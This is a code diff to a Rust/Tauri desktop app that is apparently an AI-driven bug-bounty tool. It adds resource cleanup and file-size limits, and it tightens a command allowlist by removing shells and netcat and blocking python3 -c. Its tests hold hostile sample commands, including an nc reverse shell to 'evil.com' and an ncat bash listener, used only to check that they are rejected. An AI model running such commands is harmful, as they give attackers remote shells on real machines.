@@ -30,6 +30,7 @@ pub mod h1_api;
 pub mod secure_storage;
 pub mod tool_checker;
 pub mod sandbox;
+pub mod agent_browser;
 
 // Re-exports for convenience
 pub use safe_to_test::{ScopeEntry, ScopeValidator, ScopeError};
@@ -38,9 +39,14 @@ pub use kill_switch::{KillSwitch, KillReason, KillEvent, KillSwitchError};
 pub use proxy_pool::{ProxyPool, ProxyConfig, ProxyType, RotationStrategy, HealthStatus, ProxyError};
 
 use std::sync::{Arc, Mutex};
+use tauri::Manager;
 use tokio::sync::Mutex as TokioMutex;
 use tracing::{info, warn};
 use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};
+
+/// Maximum file size for read operations (10 MB).
+/// Prevents memory exhaustion if an agent is tricked into reading a large file.
+const MAX_FILE_READ_SIZE: u64 = 10 * 1024 * 1024;
 
 /// Initialize the application
 pub fn init() {
@@ -95,6 +101,14 @@ pub fn run() {
 
     // Wire signal handlers to the shared instance
     kill_switch::setup_signal_handlers(Arc::clone(&kill_switch));
+
+    // Prune old PTY .cast recordings at startup — retention policy caps growth
+    // at 7 days / 500 files. Hunt #11 caught 2,696 files / 21MB accumulated.
+    // This runs synchronously but is <100ms for ~thousands of files.
+    let (pruned, kept) = pty_manager::prune_recordings();
+    if pruned > 0 {
+        tracing::info!(pruned, kept, "PTY recordings pruned at startup");
+    }
 
     // Initialize SandboxManager (Docker/Podman) — wrapped in Option because
     // the runtime might not be available on all systems
@@ -158,9 +172,11 @@ pub fn run() {
             // Sandbox commands
             sandbox::create_sandbox,
             sandbox::sandbox_exec,
+            sandbox::sandbox_write_file,
             sandbox::destroy_sandbox,
             sandbox::list_sandboxes,
             sandbox::destroy_all_sandboxes,
+            sandbox::reap_orphan_sandboxes,
             // File operations for tool output management
             write_tool_output,
             read_tool_output,
@@ -185,9 +201,59 @@ pub fn run() {
             knowledge_db_execute,
             // HTTP proxy (bypasses browser CORS)
             proxy_http_request,
+            // Agent browser IPC (I2)
+            agent_browser::agent_browser_spawn,
+            agent_browser::agent_browser_send,
+            agent_browser::agent_browser_kill,
         ])
-        .run(tauri::generate_context!())
-        .expect("error while running tauri application");
+        .build(tauri::generate_context!())
+        .expect("error while building tauri application")
+        .run(|app_handle, event| {
+            // Issue #7: on app exit, destroy every sandbox and kill every
+            // browser subprocess we spawned. Before this hook was wired, a
+            // normal window-close left 5 sandbox containers and 3 Playwright
+            // Node processes orphaned every session. kill_switch.rs already
+            // has destroy_all() but it only fires on the kill-switch, not on
+            // graceful exit.
+            //
+            // We use ExitRequested (fires after windows close, before the
+            // process terminates) so async cleanup has time to complete.
+            // Exit (post-process-teardown) is too late for Docker HTTP calls.
+            if let tauri::RunEvent::ExitRequested { .. } = event {
+                tracing::info!("app exit requested — tearing down sandboxes and browser subprocesses");
+                let sandbox_state = app_handle
+                    .state::<Arc<TokioMutex<Option<sandbox::SandboxManager>>>>();
+                let sandbox_state_arc = sandbox_state.inner().clone();
+
+                // Spawn cleanup on a dedicated thread with its own runtime —
+                // the main Tauri runtime may already be tearing down.
+                let _ = std::thread::spawn(move || {
+                    let rt = match tokio::runtime::Runtime::new() {
+                        Ok(rt) => rt,
+                        Err(e) => {
+                            tracing::warn!(error = %e, "shutdown: could not create tokio runtime — skipping cleanup");
+                            return;
+                        }
+                    };
+                    rt.block_on(async move {
+                        // Sandboxes first (heavier — Docker API calls).
+                        let guard = sandbox_state_arc.lock().await;
+                        if let Some(mgr) = guard.as_ref() {
+                            match mgr.destroy_all().await {
+                                Ok(n) => tracing::info!(destroyed = n, "shutdown: sandboxes destroyed"),
+                                Err(e) => tracing::warn!(error = %e, "shutdown: destroy_all failed"),
+                            }
+                        }
+                        drop(guard);
+
+                        // Then browser subprocesses.
+                        let killed = agent_browser::shutdown_cleanup().await;
+                        tracing::info!(killed, "shutdown: browser subprocesses cleaned");
+                    });
+                })
+                .join();
+            }
+        });
 }
 
 // ─── Path validation (Block 6: IPC Security) ────────────────────────────────
@@ -233,6 +299,14 @@ fn validate_huntress_path(path: &str) -> Result<std::path::PathBuf, String> {
 #[tauri::command]
 async fn read_file_binary(path: String) -> Result<String, String> {
     validate_huntress_path(&path)?;
+    let metadata = std::fs::metadata(&path)
+        .map_err(|e| format!("Failed to read file metadata {}: {}", path, e))?;
+    if metadata.len() > MAX_FILE_READ_SIZE {
+        return Err(format!(
+            "File {} exceeds maximum read size ({} bytes > {} byte limit)",
+            path, metadata.len(), MAX_FILE_READ_SIZE
+        ));
+    }
     let data = std::fs::read(&path)
         .map_err(|e| format!("Failed to read binary file {}: {}", path, e))?;
     use base64::Engine;
@@ -250,6 +324,14 @@ async fn write_tool_output(path: String, content: String) -> Result<(), String> 
 #[tauri::command]
 async fn read_tool_output(path: String) -> Result<String, String> {
     validate_huntress_path(&path)?;
+    let metadata = std::fs::metadata(&path)
+        .map_err(|e| format!("Failed to read file metadata {}: {}", path, e))?;
+    if metadata.len() > MAX_FILE_READ_SIZE {
+        return Err(format!(
+            "File {} exceeds maximum read size ({} bytes > {} byte limit)",
+            path, metadata.len(), MAX_FILE_READ_SIZE
+        ));
+    }
     std::fs::read_to_string(&path)
         .map_err(|e| format!("Failed to read file {}: {}", path, e))
 }
@@ -312,6 +394,14 @@ async fn append_to_file(path: String, content: String) -> Result<(), String> {
 #[tauri::command]
 async fn read_file_text(path: String) -> Result<String, String> {
     validate_huntress_path(&path)?;
+    let metadata = std::fs::metadata(&path)
+        .map_err(|e| format!("Failed to read file metadata {}: {}", path, e))?;
+    if metadata.len() > MAX_FILE_READ_SIZE {
+        return Err(format!(
+            "File {} exceeds maximum read size ({} bytes > {} byte limit)",
+            path, metadata.len(), MAX_FILE_READ_SIZE
+        ));
+    }
     std::fs::read_to_string(&path)
         .map_err(|e| format!("Failed to read file {}: {}", path, e))
 }
@@ -420,7 +510,9 @@ async fn get_system_info() -> Result<serde_json::Value, String> {
     }))
 }
 
-/// Allowed programs for training command execution
+/// Allowed programs for training command execution.
+/// SECURITY: bash, sh, nc, ncat are explicitly EXCLUDED — they bypass
+/// the PTY approval gate and enable arbitrary command execution.
 const ALLOWED_TRAINING_PROGRAMS: &[&str] = &[
     // Training pipeline
     "python", "python3", "pip", "pip3",
@@ -433,8 +525,51 @@ const ALLOWED_TRAINING_PROGRAMS: &[&str] = &[
     "gobuster", "ffuf", "dirb", "hydra", "wfuzz",
     "httpie", "http", "jq", "grep", "awk", "sed",
     "cat", "echo", "base64", "xxd", "openssl",
-    "nc", "ncat", "bash", "sh",
 ];
+
+/// Programs that require first-argument validation (e.g., python3 must only
+/// run scripts from allowed directories, not arbitrary code via -c).
+const RESTRICTED_FIRST_ARGS: &[&str] = &["-c", "-m", "--command"];
+
+/// Allowed script directories for python/python3 execution
+const ALLOWED_SCRIPT_DIRS: &[&str] = &["scripts/", "training/", "benchmark/"];
+
+/// Validate that a training command's arguments are safe.
+/// For python/python3: blocks `-c` (arbitrary code) and requires the first
+/// positional argument to be a path under an allowed directory.
+fn validate_training_args(program: &str, args: &[String]) -> Result<(), String> {
+    match program {
+        "python" | "python3" => {
+            if args.is_empty() {
+                return Err("python3 requires at least one argument (script path)".to_string());
+            }
+            // Block dangerous flags that allow arbitrary code execution
+            for arg in args {
+                if RESTRICTED_FIRST_ARGS.contains(&arg.as_str()) {
+                    return Err(format!(
+                        "python3 flag '{}' is not allowed — use a script file instead",
+                        arg
+                    ));
+                }
+            }
+            // The first non-flag argument must be under an allowed directory
+            let first_positional = args.iter().find(|a| !a.starts_with('-'));
+            if let Some(script_path) = first_positional {
+                let is_allowed = ALLOWED_SCRIPT_DIRS
+                    .iter()
+                    .any(|dir| script_path.starts_with(dir));
+                if !is_allowed {
+                    return Err(format!(
+                        "python3 script '{}' is not in an allowed directory ({:?})",
+                        script_path, ALLOWED_SCRIPT_DIRS
+                    ));
+                }
+            }
+            Ok(())
+        }
+        _ => Ok(()),
+    }
+}
 
 /// Execute a training command (LoRA, Axolotl, etc.) in a subprocess
 #[tauri::command]
@@ -442,6 +577,9 @@ async fn execute_training_command(program: String, args: Vec<String>, cwd: Optio
     if !ALLOWED_TRAINING_PROGRAMS.contains(&program.as_str()) {
         return Err(format!("Program not in allowlist: {}", program));
     }
+    // Validate arguments for restricted programs (e.g., python3 -c blocked)
+    validate_training_args(&program, &args)?;
+
     info!("Training command: {} {:?}", program, args);
 
     let mut cmd = std::process::Command::new(&program);
@@ -663,22 +801,20 @@ async fn knowledge_db_query(db_path: String, sql: String, params: Vec<String>) -
         .collect();
 
     let column_names: Vec<String> = stmt.column_names().iter().map(|s| s.to_string()).collect();
-    let column_count = column_names.len();
-
     let rows: Vec<serde_json::Value> = stmt.query_map(rusqlite::params_from_iter(param_refs), |row| {
         let mut obj = serde_json::Map::new();
-        for i in 0..column_count {
+        for (i, col_name) in column_names.iter().enumerate() {
             let val: rusqlite::Result<String> = row.get(i);
             match val {
-                Ok(s) => { obj.insert(column_names[i].clone(), serde_json::Value::String(s)); }
+                Ok(s) => { obj.insert(col_name.clone(), serde_json::Value::String(s)); }
                 Err(_) => {
                     // Try as f64
                     if let Ok(f) = row.get::<_, f64>(i) {
-                        obj.insert(column_names[i].clone(), serde_json::json!(f));
+                        obj.insert(col_name.clone(), serde_json::json!(f));
                     } else if let Ok(n) = row.get::<_, i64>(i) {
-                        obj.insert(column_names[i].clone(), serde_json::json!(n));
+                        obj.insert(col_name.clone(), serde_json::json!(n));
                     } else {
-                        obj.insert(column_names[i].clone(), serde_json::Value::Null);
+                        obj.insert(col_name.clone(), serde_json::Value::Null);
                     }
                 }
             }
@@ -837,5 +973,210 @@ mod tests {
         let _ = PtyManager::new();
         let _ = KillSwitch::new();
         let _ = ProxyPool::new(RotationStrategy::RoundRobin);
+    }
+
+    // === M1: Training allowlist security tests ===
+
+    #[test]
+    fn test_training_allowlist_rejects_bash() {
+        assert!(
+            !ALLOWED_TRAINING_PROGRAMS.contains(&"bash"),
+            "bash must not be in ALLOWED_TRAINING_PROGRAMS"
+        );
+    }
+
+    #[test]
+    fn test_training_allowlist_rejects_sh() {
+        assert!(
+            !ALLOWED_TRAINING_PROGRAMS.contains(&"sh"),
+            "sh must not be in ALLOWED_TRAINING_PROGRAMS"
+        );
+    }
+
+    #[test]
+    fn test_training_allowlist_rejects_nc() {
+        assert!(
+            !ALLOWED_TRAINING_PROGRAMS.contains(&"nc"),
+            "nc (netcat) must not be in ALLOWED_TRAINING_PROGRAMS"
+        );
+    }
+
+    #[test]
+    fn test_training_allowlist_rejects_ncat() {
+        assert!(
+            !ALLOWED_TRAINING_PROGRAMS.contains(&"ncat"),
+            "ncat must not be in ALLOWED_TRAINING_PROGRAMS"
+        );
+    }
+
+    #[test]
+    fn test_training_allowlist_permits_training_tools() {
+        for program in &["python3", "axolotl", "pip3", "nvidia-smi", "huggingface-cli"] {
+            assert!(
+                ALLOWED_TRAINING_PROGRAMS.contains(program),
+                "{} must be in ALLOWED_TRAINING_PROGRAMS",
+                program
+            );
+        }
+    }
+
+    #[test]
+    fn test_python3_rejects_dash_c_arbitrary_code() {
+        // Test payload is intentionally malicious — validation must reject it
+        let result = validate_training_args(
+            "python3",
+            &["-c".to_string(), "print('pwned')".to_string()],
+        );
+        assert!(result.is_err(), "python3 -c must be rejected");
+        assert!(result.unwrap_err().contains("-c"));
+    }
+
+    #[test]
+    fn test_python3_rejects_dash_m_flag() {
+        let result = validate_training_args(
+            "python3",
+            &["-m".to_string(), "http.server".to_string()],
+        );
+        assert!(result.is_err(), "python3 -m must be rejected");
+    }
+
+    #[test]
+    fn test_python3_rejects_script_outside_allowed_dirs() {
+        let result = validate_training_args(
+            "python3",
+            &["/tmp/malicious.py".to_string()],
+        );
+        assert!(result.is_err(), "python3 with script outside allowed dirs must be rejected");
+    }
+
+    #[test]
+    fn test_python3_accepts_script_in_scripts_dir() {
+        let result = validate_training_args(
+            "python3",
+            &["scripts/format_training_data.py".to_string()],
+        );
+        assert!(result.is_ok(), "python3 scripts/... must be allowed");
+    }
+
+    #[test]
+    fn test_python3_accepts_script_in_training_dir() {
+        let result = validate_training_args(
+            "python3",
+            &["training/finetune.py".to_string()],
+        );
+        assert!(result.is_ok(), "python3 training/... must be allowed");
+    }
+
+    #[test]
+    fn test_python3_accepts_script_in_benchmark_dir() {
+        let result = validate_training_args(
+            "python3",
+            &["benchmark/run_xbow.py".to_string()],
+        );
+        assert!(result.is_ok(), "python3 benchmark/... must be allowed");
+    }
+
+    #[test]
+    fn test_python3_rejects_empty_args() {
+        let result = validate_training_args("python3", &[]);
+        assert!(result.is_err(), "python3 with no args must be rejected");
+    }
+
+    #[test]
+    fn test_non_python_programs_skip_arg_validation() {
+        let result = validate_training_args(
+            "curl",
+            &["-s".to_string(), "http://example.com".to_string()],
+        );
+        assert!(result.is_ok());
+    }
+
+    #[tokio::test]
+    async fn test_execute_training_command_rejects_bash() {
+        let result = execute_training_command(
+            "bash".to_string(),
+            vec!["-c".to_string(), "id".to_string()],
+            None,
+        )
+        .await;
+        assert!(result.is_err(), "bash must be rejected by execute_training_command");
+    }
+
+    #[tokio::test]
+    async fn test_execute_training_command_rejects_sh() {
+        let result = execute_training_command(
+            "sh".to_string(),
+            vec!["-c".to_string(), "whoami".to_string()],
+            None,
+        )
+        .await;
+        assert!(result.is_err(), "sh must be rejected by execute_training_command");
+    }
+
+    #[tokio::test]
+    async fn test_execute_training_command_rejects_nc_reverse_shell() {
+        let result = execute_training_command(
+            "nc".to_string(),
+            vec!["-e".to_string(), "/bin/sh".to_string(), "evil.com".to_string(), "4444".to_string()],
+            None,
+        )
+        .await;
+        assert!(result.is_err(), "nc must be rejected by execute_training_command");
+    }
+
+    #[tokio::test]
+    async fn test_execute_training_command_rejects_ncat() {
+        let result = execute_training_command(
+            "ncat".to_string(),
+            vec!["--exec".to_string(), "/bin/bash".to_string(), "-l".to_string(), "4444".to_string()],
+            None,
+        )
+        .await;
+        assert!(result.is_err(), "ncat must be rejected by execute_training_command");
+    }
+
+    #[tokio::test]
+    async fn test_execute_training_command_rejects_python3_dash_c() {
+        let result = execute_training_command(
+            "python3".to_string(),
+            vec!["-c".to_string(), "print('test')".to_string()],
+            None,
+        )
+        .await;
+        assert!(result.is_err(), "python3 -c must be rejected");
+    }
+
+    // === I5: File size limit tests ===
+
+    #[test]
+    fn test_max_file_read_size_is_10mb() {
+        assert_eq!(MAX_FILE_READ_SIZE, 10 * 1024 * 1024);
+    }
+
+    #[tokio::test]
+    async fn test_read_file_text_small_file_succeeds() {
+        let dir = std::env::temp_dir().join("huntress_test_i5");
+        let _ = std::fs::create_dir_all(&dir);
+        let file_path = dir.join("small.txt");
+        std::fs::write(&file_path, "hello world").unwrap();
+
+        let result = read_file_text(file_path.to_string_lossy().to_string()).await;
+        assert!(result.is_ok(), "small file should read successfully");
+        assert_eq!(result.unwrap(), "hello world");
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn test_file_size_error_message_format() {
+        let file_size: u64 = 20 * 1024 * 1024;
+        let path = "/tmp/huge.bin";
+        let msg = format!(
+            "File {} exceeds maximum read size ({} bytes > {} byte limit)",
+            path, file_size, MAX_FILE_READ_SIZE
+        );
+        assert!(msg.contains("20971520 bytes"));
+        assert!(msg.contains("10485760 byte limit"));
+        assert!(msg.contains("/tmp/huge.bin"));
     }
 }
